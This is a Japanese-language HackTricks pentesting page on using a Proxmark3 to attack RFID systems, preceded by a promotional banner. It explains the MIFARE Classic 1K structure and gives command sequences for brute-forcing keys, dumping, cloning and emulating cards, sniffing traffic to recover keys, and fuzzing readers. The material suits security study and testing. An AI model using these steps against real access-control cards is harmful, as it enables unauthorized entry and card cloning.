# Proxmark 3

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけます
* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れます
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください**。

</details>

## Proxmark3を使用したRFIDシステムへの攻撃

最初に必要なのは、[**Proxmark3**](https://proxmark.com)を持っており、[**ソフトウェアをインストールし、その依存関係を解決**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**します**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)。

### MIFARE Classic 1KBの攻撃

**16のセクター**があり、それぞれに**4つのブロック**があり、各ブロックには**16B**が含まれています。UIDはセクター0のブロック0にあります（変更できません）。\
各セクターにアクセスするには、**2つの鍵**（**A**と**B**）が必要で、これらは各セクターの**ブロック3に保存**されています（セクタートレーラー）。セクタートレーラーには、各ブロックの**読み取りおよび書き込み**権限を与える**アクセスビット**も保存されています。\
2つの鍵は、最初の鍵を知っている場合に読み取り権限を与え、2番目の鍵を知っている場合に書き込み権限を与えるために役立ちます（例えば）。

複数の攻撃が実行できます。
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3は、**盗聴**や**Tag to Reader通信**などの他のアクションを実行することができます。このカードでは、**暗号操作が弱い**ため、通信をスニッフィングして使用されているキーを計算することができます（`mfkey64`ツール）。

### 生のコマンド

IoTシステムでは、**非ブランドまたは非商用のタグ**が使用されることがあります。この場合、Proxmark3を使用してタグに対してカスタム**生のコマンドを送信**することができます。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
この情報を使用して、カードに関する情報やそれとの通信方法について検索を試みることができます。Proxmark3を使用すると、`hf 14a raw -p -b 7 26`のような**rawコマンド**を送信できます。

### スクリプト

Proxmark3ソフトウェアには、簡単なタスクを実行するために使用できる**自動化スクリプト**の事前ロードされたリストが付属しています。完全なリストを取得するには、`script list`コマンドを使用します。次に、スクリプトの名前に続いて`script run`コマンドを使用します。
```
proxmark3> script run mfkeys
```
```
ある**有効なカード**のデータをコピーして、**タグリーダー**を**fuzz**するスクリプトを作成できます。ただし、1つ以上の**ランダムなバイト**を**ランダム化**し、**リーダーがクラッシュ**するかどうかを確認する**Luaスクリプト**を作成してください。
```
